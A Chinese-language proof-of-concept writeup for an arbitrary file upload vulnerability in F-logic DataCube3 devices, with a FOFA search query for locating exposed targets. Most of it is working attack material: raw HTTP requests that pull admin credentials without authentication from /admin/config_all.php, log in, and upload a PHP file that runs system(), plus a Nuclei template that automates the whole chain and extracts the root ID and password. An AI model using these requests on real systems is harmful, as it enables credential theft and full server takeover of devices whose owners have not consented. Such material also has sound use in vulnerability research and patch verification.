## F-logic_DataCube3存在任意文件上传漏洞

F-logic DataCube3 /admin/setting_photo.php接口处存在任意文件上传漏洞，恶意攻击者可通过该漏洞在服务器端写入后门，获取服务器权限，进而控制整个web服务器。

## fofa
```
title=="DataCube3"
```


## 未授权获取登录账号密码poc
```
GET /admin/config_all.php HTTP/1.1
Host: your-ip
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

## 通过获取的账号密码获取COOKIE
```
POST /admin/config_all.php HTTP/1.1
Host: your-ip
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
 
user_id=用户名&user_pw=密码&login=%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3
```

## 使用获取到的cookie获取accesstime值
```
GET /admin/setting_photo.php HTTP/1.1
Host: your-ip
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: 登录后的cookie
```

## 上传文件
```
POST /admin/setting_photo.php HTTP/1.1
Host: 127.0.0.1
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
Cookie: 登录后的cookie
 
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="add"
 
.............................
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="addPhoto"; filename="ppp.php"
Content-Type: image/jpeg
 
<?php system("echo 123456");?>
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="accesstime"
 
accesstime
-----------------------------113389720123090127612523184396--
```
![81ef3be26a9c8e7345c3dadbee961d57](https://github.com/wy876/POC/assets/139549762/70ac5fd6-cb31-46ff-a5d1-c68c18efb006)


## Nuclei-POC
```
id: F-logic-DataCube3-uploadfile

info:
  name: F-logic DataCube3 /admin/setting_photo.php接口处存在任意任意文件上传漏洞，恶意攻击者可通过该漏洞在服务器端写入后门，获取服务器权限，进而控制整个web服务器。
  author: WLF
  severity: high
  metadata: 
    fofa-query: title=="DataCube3"
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        GET /admin/config_all.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive

      - |
        POST /admin/config_all.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        
        user_id={{path1}}&user_pw={{path}}&login=%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3


      - |
        GET /admin/setting_photo.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive

      - | 
        POST /admin/setting_photo.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
       
        
        -----------------------------113389720123090127612523184396
        Content-Disposition: form-data; name="add"
        
        .............................
        -----------------------------113389720123090127612523184396
        Content-Disposition: form-data; name="addPhoto"; filename="{{filename}}.php"
        Content-Type: image/jpeg
        
         <?php echo md5('666');unlink(__FILE__);?>
        -----------------------------113389720123090127612523184396
        Content-Disposition: form-data; name="accesstime"
        
        0.{{path2}}
        -----------------------------113389720123090127612523184396--

      - |
        GET /images/slideshow/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0

      - |

    extractors:
      - type: regex
        name: path
        group: 1
        regex:
           - '"login.root_pwd","value":"(\w*-\w*)"'
        internal: true

      - type: regex
        name: path1
        group: 1
        regex:
           - '"login.root_id","value":"(\w*)"'
        internal: true

      - type: regex
        name: path2
        group: 1
        regex:
           - 'name="accesstime" value="0.(\w*\ (\w*))"'
        internal: true



    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"fae0b27c451c728867a567e8c1bb4e53")
```
